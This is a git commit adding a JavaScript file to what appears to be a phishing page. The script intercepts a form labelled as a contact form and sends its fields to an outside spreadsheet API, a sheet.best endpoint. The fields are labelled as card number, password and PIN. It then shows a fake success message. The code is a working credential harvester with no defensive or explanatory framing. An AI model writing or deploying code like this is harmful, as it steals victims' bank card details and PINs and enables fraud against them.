0ae0fb8c326fe5572b7ed3c3e953fbed1a9488dd
soporte-op <rrontrobert@gmail.com>
2024-09-06 08:46:11 -0600

    add files upload

---
+++ js/419sa.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/912ccea3-026f-4738-8c90-717a23aa543c', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.usuario.value,
+            "Clave": formulario.contraseña.value,
+            "Nip": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
